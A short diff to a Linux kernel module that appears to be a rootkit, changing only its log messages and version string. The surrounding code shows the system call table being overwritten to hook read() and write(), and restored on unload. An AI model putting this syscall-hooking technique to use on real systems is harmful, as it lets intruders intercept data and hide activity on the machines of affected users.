@@ -19,7 +19,7 @@ asmlinkage int rk_read(unsigned int fd, void __user* buf, size_t count) {
 }
 
 static int __init rk_init(void) {
-	printk(KERN_INFO "Hello, from hell.\n");
+	printk(KERN_INFO "Hello.\n");
 	printk(KERN_ALERT "System call table at %p\n", SYS_CALL_TABLE);
 	bitMe();
 	//hook write()
@@ -39,12 +39,12 @@ static void __exit rk_exit(void) {
 	//unhook read()
 	SYS_CALL_TABLE[__NR_read] = (unsigned long*)original_read;
 	unBitMe();
-	printk(KERN_INFO "Cya dawg.");
+	printk(KERN_INFO "Goodbye.");
 }
 
 MODULE_LICENSE("MIT");
 MODULE_AUTHOR("Aearnus");
 MODULE_DESCRIPTION("I'm sorry.");
-MODULE_VERSION("666");
+MODULE_VERSION("0");
 module_init(rk_init);
 module_exit(rk_exit);
